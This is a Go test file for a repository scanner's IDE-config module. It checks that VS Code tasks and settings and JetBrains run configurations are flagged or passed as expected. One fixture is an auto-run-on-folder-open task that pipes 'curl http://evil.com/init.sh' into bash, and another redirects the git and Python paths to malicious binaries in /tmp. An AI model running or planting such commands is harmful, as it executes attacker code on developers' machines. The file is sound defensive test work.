package scanner_test

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

// writeJSON writes v as JSON to the given path, creating parent directories.
func writeJSON(t *testing.T, path string, v any) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		t.Fatal(err)
	}
	data, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		t.Fatal(err)
	}
}

func TestIDEConfigs_NoIDEFiles(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main"), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestIDEConfigs_VSCodeTaskFolderOpen(t *testing.T) {
	dir := t.TempDir()
	tasks := map[string]any{
		"version": "2.0.0",
		"tasks": []map[string]any{
			{
				"label":   "Setup",
				"type":    "shell",
				"command": "curl http://evil.com/init.sh | bash",
				"runOptions": map[string]any{
					"runOn": "folderOpen",
				},
			},
		},
	}
	writeJSON(t, filepath.Join(dir, ".vscode", "tasks.json"), tasks)

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for folderOpen task, got none")
	}
	if findings[0].Severity != scanner.High {
		t.Errorf("severity = %v, want HIGH", findings[0].Severity)
	}
}

func TestIDEConfigs_VSCodeTaskNoFolderOpen(t *testing.T) {
	// A tasks.json without runOn:folderOpen is not auto-executing.
	dir := t.TempDir()
	tasks := map[string]any{
		"version": "2.0.0",
		"tasks": []map[string]any{
			{
				"label":   "Build",
				"type":    "shell",
				"command": "go build ./...",
			},
		},
	}
	writeJSON(t, filepath.Join(dir, ".vscode", "tasks.json"), tasks)

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings for safe task, want 0", len(findings))
	}
}

func TestIDEConfigs_VSCodeDangerousSettings(t *testing.T) {
	dir := t.TempDir()
	settings := map[string]any{
		"git.path":          "/tmp/malicious-git",
		"editor.fontSize":   14,
		"python.pythonPath": "/tmp/evil-python",
	}
	writeJSON(t, filepath.Join(dir, ".vscode", "settings.json"), settings)

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected findings for dangerous settings, got none")
	}
	for _, f := range findings {
		if f.Severity != scanner.High {
			t.Errorf("severity = %v, want HIGH", f.Severity)
		}
	}
}

func TestIDEConfigs_VSCodeSafeSettings(t *testing.T) {
	dir := t.TempDir()
	settings := map[string]any{
		"editor.tabSize":  4,
		"editor.fontSize": 14,
		"files.autoSave":  "onFocusChange",
	}
	writeJSON(t, filepath.Join(dir, ".vscode", "settings.json"), settings)

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe settings got %d findings, want 0", len(findings))
	}
}

func TestIDEConfigs_IntelliJRunManager(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ".idea"), 0755); err != nil {
		t.Fatal(err)
	}
	xmlContent := `<?xml version="1.0" encoding="UTF-8"?>
<project version="4">
  <component name="RunManager" selected="Application.Main">
    <configuration name="Main" type="Application" factoryName="Application">
      <option name="MAIN_CLASS_NAME" value="com.example.Main" />
    </configuration>
  </component>
</project>`
	xmlPath := filepath.Join(dir, ".idea", "workspace.xml")
	if err := os.WriteFile(xmlPath, []byte(xmlContent), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for JetBrains RunManager, got none")
	}
	if findings[0].Severity != scanner.High {
		t.Errorf("severity = %v, want HIGH", findings[0].Severity)
	}
}

func TestIDEConfigs_IntelliJSafeXML(t *testing.T) {
	dir := t.TempDir()
	if err := os.MkdirAll(filepath.Join(dir, ".idea"), 0755); err != nil {
		t.Fatal(err)
	}
	xmlContent := `<?xml version="1.0" encoding="UTF-8"?>
<project version="4">
  <component name="ProjectModuleManager">
    <modules><module /></modules>
  </component>
</project>`
	if err := os.WriteFile(filepath.Join(dir, ".idea", "modules.xml"), []byte(xmlContent), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewIDEConfigsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe .idea XML got %d findings, want 0", len(findings))
	}
}

func TestIDEConfigs_Name(t *testing.T) {
	m := scanner.NewIDEConfigsModule()
	if m.Name() != "ide-configs" {
		t.Errorf("Name() = %q, want %q", m.Name(), "ide-configs")
	}
}
